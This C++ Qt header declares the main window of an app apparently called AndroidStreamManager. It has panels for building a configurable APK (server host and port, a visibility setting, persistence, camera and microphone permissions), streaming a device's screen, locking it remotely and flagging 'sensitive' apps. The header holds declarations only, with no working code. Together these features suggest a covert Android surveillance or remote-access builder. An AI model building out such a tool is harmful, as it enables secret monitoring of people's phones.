#ifndef MAIN_WINDOW_H
#define MAIN_WINDOW_H

#include <QMainWindow>
#include <QTimer>
#include <memory>
#include "core/device_manager.h"
#include "core/apk_builder.h"

QT_BEGIN_NAMESPACE
class QLabel;
class QListWidget;
class QStackedWidget;
class QPushButton;
class QTextEdit;
class QLineEdit;
class QComboBox;
class QCheckBox;
class QSpinBox;
class QProgressBar;
class QTableWidget;
QT_END_NAMESPACE

class MonitoringWidget;
class StreamingViewer;
class AppMonitoringWidget;

namespace AndroidStreamManager {

class MainWindow : public QMainWindow {
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();

private slots:
    void onBuildApkClicked();
    void onStartStreamClicked();
    void onPauseStreamClicked();
    void onRestartConnectionClicked();
    void onTerminateSessionClicked();
    void onDeviceSelectionChanged();
    void onUpdateStatistics();

    // Monitoramento
    void showMonitoringDashboard();
    void refreshMonitoringData();
    void onAlertReceived(const QString& message, const QString& severity);

    // Streaming Viewer
    void showStreamingViewer();
    void onStreamingStarted(const QString& deviceId);
    void onStreamingStopped(const QString& deviceId);
    void onStreamingError(const QString& error);

    // Controle Remoto de Tela
    void onLockRemoteScreen();
    void onUnlockRemoteScreen();

    // Monitoramento de Apps
    void showAppMonitoringWidget();
    void onAppDetected(const QString& appName, const QString& category);
    void onSensitiveAppDetected(const QString& appName, const QString& category);

    // Configuração APK
    void onSelectIconClicked();
    void onPermissionToggled();
    void onVisibilityChanged(int index);
    
    // Build progress
    void onBuildProgress(int percent, const QString& message);
    void onBuildComplete(const BuildResult& result);

private:
    void setupUI();
    void setupConnections();
    void updateDeviceList();
    void showEventLog(const std::string& deviceId, const std::string& message);
    
    // Painéis da interface
    void setupApkConfigPanel();
    void setupDeviceControlPanel();
    void setupEventLogPanel();
    void setupBuildHistoryPanel();
    
    // Componentes principais
    std::unique_ptr<DeviceManager> deviceManager;
    std::unique_ptr<IApkBuilder> apkBuilder;
    
    // Widgets da interface
    QStackedWidget *mainStack;
    QListWidget *deviceList;
    QTableWidget *buildHistoryTable;
    MonitoringWidget *monitoringWidget;
    StreamingViewer *streamingViewer;
    AppMonitoringWidget *appMonitoringWidget;
    QTextEdit *eventLog;
    QLabel *statusLabel;
    QProgressBar *buildProgress;
    
    // Configuração APK
    QLineEdit *appNameEdit;
    QLineEdit *serverHostEdit;
    QSpinBox *serverPortSpin;
    QComboBox *visibilityCombo;
    QCheckBox *cameraPermissionCheck;
    QCheckBox *microphonePermissionCheck;
    QCheckBox *persistenceCheck;
    
    QTimer *updateTimer;
};

} // namespace AndroidStreamManager

#endif // MAIN_WINDOW_H